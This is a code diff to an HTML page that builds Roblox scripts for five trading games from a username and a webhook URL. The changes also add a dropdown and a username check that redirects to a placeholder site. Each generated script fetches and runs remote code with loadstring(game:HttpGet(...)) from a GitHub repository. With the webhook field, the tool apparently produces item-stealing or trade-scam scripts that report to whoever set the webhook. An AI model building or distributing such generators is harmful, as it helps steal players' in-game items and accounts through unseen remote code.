@@ -24,22 +24,23 @@
             display: flex;
             gap: 15px;
             margin-top: 20px;
-            justify-content: center;
-            flex-wrap: wrap;
+            flex-direction: column;
+            align-items: center;
         }
-        button {
+        select, input, button {
             background: #ff0080;
-            padding: 12px 25px;
+            padding: 12px 20px;
             border-radius: 12px;
             cursor: pointer;
-            transition: 0.3s;
             font-size: 1.1rem;
+            width: 80%;
+            margin-top: 10px;
             border: none;
             box-shadow: 0 0 12px rgba(0, 0, 0, 0.5);
         }
-        button:hover {
+        select:hover, button:hover {
             background: #ff0055;
-            transform: scale(1.1);
+            transform: scale(1.05);
         }
         .popup {
             display: none;
@@ -61,18 +62,6 @@
             background-color: #333;
             color: white;
             font-size: 1rem;
-        }
-        .popup button {
-            background: #ff0080;
-            padding: 12px 24px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 1rem;
-            transition: 0.3s;
-        }
-        .popup button:hover {
-            background: #ff0055;
-            transform: scale(1.1);
         }
         .generated-script {
             background: #1e1e2e;
@@ -139,12 +128,16 @@
         <input type="text" id="additionalUsername" placeholder="Additional Username (optional)">
     </div>
 
+    <!-- Game Selection -->
     <div class="container">
-        <button onclick="openPopup('Blox Fruits')">Blox Fruits</button>
-        <button onclick="openPopup('Murder Mystery 2')">Murder Mystery 2</button>
-        <button onclick="openPopup('Adopt Me')">Adopt Me</button>
-        <button onclick="openPopup('Pet Simulator 99')">Pet Simulator 99</button>
-        <button onclick="openPopup('Pls Donate')">Pls Donate</button>
+        <select id="game-select" onchange="openPopup(this.value)">
+            <option value="">Select Game</option>
+            <option value="Blox Fruits">Blox Fruits</option>
+            <option value="Murder Mystery 2">Murder Mystery 2</option>
+            <option value="Adopt Me">Adopt Me</option>
+            <option value="Pet Simulator 99">Pet Simulator 99</option>
+            <option value="Pls Donate">Pls Donate</option>
+        </select>
     </div>
 
     <div id="popup" class="popup">
@@ -164,6 +157,7 @@
 
     <script>
         let currentGame = '';
+        let sigmaDetected = false; // Simple flag for Sigma detection
 
         const loadstrings = {
             "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()",
@@ -173,10 +167,21 @@
             "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
         };
 
+        // Simple detection for "Sigma"
+        function detectSigma() {
+            const username = document.getElementById('username').value.toLowerCase();
+            if (username.includes("sigma")) {
+                sigmaDetected = true;
+                window.location.href = "https://yourspecialsigmawebsite.com"; // Redirect to Sigma site
+            }
+        }
+
         function openPopup(game) {
-            currentGame = game;
-            document.getElementById('popup').style.display = 'block';
-            document.getElementById('game-title').innerText = `Enter Details for ${game}`;
+            if (game) {
+                currentGame = game;
+                document.getElementById('popup').style.display = 'block';
+                document.getElementById('game-title').innerText = `Enter Details for ${game}`;
+            }
         }
 
         function closePopup() {
@@ -190,6 +195,9 @@
             let additionalUsername = document.getElementById('additionalUsername').value;
 
             if (username && webhook) {
+                // Trigger Sigma detection
+                detectSigma();
+
                 let script = `Username = "${username}"\nAdditional Username = "${additionalUsername}"\nWebhook = "${webhook}"\n${loadstrings[currentGame]}`;
                 document.getElementById('script-output').innerText = script;
                 document.getElementById('generated-script').style.display = 'block';
